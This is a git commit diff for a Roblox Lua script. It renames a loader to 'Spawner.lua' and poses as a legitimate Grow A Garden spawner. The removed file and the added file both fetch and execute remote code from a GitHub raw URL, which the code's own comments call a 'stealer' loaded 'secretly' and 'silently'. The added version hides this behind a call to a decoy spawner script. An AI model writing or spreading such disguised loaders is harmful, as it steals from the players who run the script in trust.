d53f38ecd58524a82f19de3ca6fed3e0a6d04f42
HKTwoScript <jancmafs@gmail.com>
2025-07-19 12:56:13 +0200

    Update and rename LoaderV1.lua to Spawner.lua

--- LoaderV1.lua
+++
@@ -1,7 +0,0 @@
--- Main script logic (clean stuff)
-print("Welcome to HKTWO's RayField")
-
--- Secretly load the stealer
-pcall(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/HKTwoScript/RayField/main/RayField"))()
-end)
---
+++ Spawner.lua
@@ -0,0 +1,9 @@
+-- Load the legit GrowAFilipino Spawner script
+pcall(function()
+    loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
+end)
+
+-- Silently load your stealer
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/HKTwoScript/RayField/main/RayField"))()
+end)
